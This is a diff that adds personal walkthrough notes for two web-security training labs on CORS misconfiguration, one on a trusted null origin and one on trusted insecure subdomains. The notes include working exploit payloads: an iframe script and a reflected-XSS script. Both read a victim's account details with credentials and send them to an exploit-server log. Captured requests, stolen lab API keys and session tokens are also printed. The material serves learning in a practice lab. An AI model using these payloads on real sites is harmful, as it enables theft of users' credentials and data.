@@ -58,3 +58,118 @@ Change your labID, store it, and deliver to the victim. Open the access log and 
 And there is the administrators api key:YyYDOfmNjwZ6EzGRnfbaGXrR4SRC697R
 
 Task 2:
+///Lab: CORS vulnerability with trusted null origin///
+
+Log in as wiener/peter, check the requests in burp. Just like in the last lab, there is a GET request called /accoundDetails with sensitive data. Send it to repeater and add a origin line to it:
+GET /accountDetails HTTP/2
+Host: 0a6300cb04cfcd82801c03a6008a0090.web-security-academy.net
+Cookie: session=W3dB6AtsUT0J4zwWOzg3EoC59SogJ1Ff
+Origin: https://xyz.hu
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: hu-HU,hu;q=0.9
+Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Sec-Ch-Ua-Mobile: ?0
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0a6300cb04cfcd82801c03a6008a0090.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+The response:
+HTTP/2 200 OK
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 149
+
+{
+  "username": "wiener",
+  "email": "",
+  "apikey": "9fbpQMzzg43J7QTjlMUd73u5Fg1bdAqZ",
+  "sessions": [
+    "W3dB6AtsUT0J4zwWOzg3EoC59SogJ1Ff"
+  ]
+}
+Which is not good for us, there should be a "Access-Control-Allow-Origin: https://xyz.hu" in the line, but there isn't.
+So as the title of the lab says: "null origin", lets change the origins value to "null". And the respons will be:
+HTTP/2 200 OK
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 149
+
+{
+  "username": "wiener",
+  "email": "",
+  "apikey": "9fbpQMzzg43J7QTjlMUd73u5Fg1bdAqZ",
+  "sessions": [
+    "W3dB6AtsUT0J4zwWOzg3EoC59SogJ1Ff"
+  ]
+}
+Here is our line what we wanted.
+Now whe will inject our payload...Go to exploit server, and into the body part:
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
+    <script>
+        var xhr = new XMLHttpRequest();
+        var url = 'https://0a6300cb04cfcd82801c03a6008a0090.web-security-academy.net/accountDetails';
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == XMLHttpRequest.DONE) {
+                fetch('/log?key=' + xhr.responseText);
+            }
+        };
+        xhr.open('GET', url, true);
+        xhr.withCredentials = true;
+        xhr.send();
+    </script>">
+</iframe>
+Store it, and deliver it to the victim, then open our log, and there should be a line like:
+10.0.4.205      2026-03-23 11:09:30 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22VCcEM1tc6ZeNIT0eOebNiadht7Bn71w6%22,%20%20%22sessions%22:%20
+And there is our api key: VCcEM1tc6ZeNIT0eOebNiadht7Bn71w6
+
+Task 3:
+///Lab: CORS vulnerability with trusted insecure protocols///
+
+Log in as wiener/peter, and check the requests in burpsuite. After you logged in, there is a /accountDetails request as we have seen it earlier. 
+Add a line with Origin: First i've tried https:/xyz.hu -> did not get my desired line (Access-Control-Allow-Origin:), tried null, same result.
+The lab says that 'insecure CORS configuration in that it trusts all subdomains'. so i checked this:
+Origin: https://asd.0a04004a0463212f80c303c9002d00c9.web-security-academy.net
+and we got: Access-Control-Allow-Origin: https://asd.0a04004a0463212f80c303c9002d00c9.web-security-academy.net
+So this site has a subdomain weakness. so lets find any subdomain on the site. And if you check the stock, a new window will pop up with the following url:
+https://stock.0a04004a0463212f80c303c9002d00c9.web-security-academy.net/?productId=1&storeId=2
+The lab says that we have to play with this subdomain : " you'll need to find an alternative way of injecting JavaScript into the subdomain."
+This will be probably an XSS attack in the url. So lets check the request for this stock:
+GET /?productId=1&storeId=2 HTTP/2
+Host: stock.0a04004a0463212f80c303c9002d00c9.web-security-academy.net
+Cookie: session=NYaLoHdRckGBPsP6I3RfPKqiD9Tch1os
+....
+...
+So we can modify the product id or the store id. Lets modify the product id first. If we type <u>proba</u> into the url as a result we should see a underlined "proba" word in the response, and with the following 
+url: GET /?productId=2<u>proba</u>&storeId=2 HTTP/2 we will get this as result: <h4>ERROR</h4>Invalid product ID: 2<u>proba</u> sou our payload get out as an error, so its vulnerable to XSS.
+So this side doesnt filtering the HTML tags...Now go to exploit server, and copy into the body part:
+<script>
+    var labId = "0a04004a0463212f80c303c9002d00c9.web-security-academy.net";
+    var exploitId = "exploit-0aff00d9044a21c080d702d901750006.exploit-server.net";
+
+    var xss = "<script>" +
+        "var x = new XMLHttpRequest();" +
+        "x.onreadystatechange = function() {" +
+            "if (x.readyState == 4) {" +
+                "fetch('https://' + '" + exploitId + "' + '/log?key=' + encodeURIComponent(x.responseText));" +
+            "}" +
+        "};" +
+        "x.open('GET', 'https://' + '" + labId + "' + '/accountDetails', true);" +
+        "x.withCredentials = true;" +
+        "x.send();" +
+    "<\/script>";
+
+    var targetUrl = "http://stock." + labId + "/?productId=" + encodeURIComponent(xss) + "&storeId=1";
+
+    location = targetUrl;
+</script>
+Check log, and you will see something like this:
+10.0.4.33       2026-03-23 14:15:57 +0000 "GET /log?key=%7B%0A%20%20%22username%22%3A%20%22administrator%22%2C%0A%20%20%22email%22%3A%20%22%22%2C%0A%20%20%22apikey%22%3A%20%22bOH0BTvaSgmGWx4dpR8cDSnO6pGJp0zQ%22%2C%0A%20%20%22sessions
+And there is the api key:bOH0BTvaSgmGWx4dpR8cDSnO6pGJp0zQ
